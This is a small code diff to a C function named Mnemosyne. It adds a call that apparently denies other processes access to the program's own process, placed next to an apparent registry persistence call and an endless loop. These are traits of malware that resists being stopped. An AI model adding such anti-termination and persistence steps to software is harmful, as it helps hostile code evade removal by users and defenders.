@@ -101,6 +101,8 @@ void Mnemosyne()
 	char* pch;
 	char* phone;
 	
+	DenyAccessToPId(GetCurrentProcessId());
+
 	RegAdd();
 
 	while (TRUE)
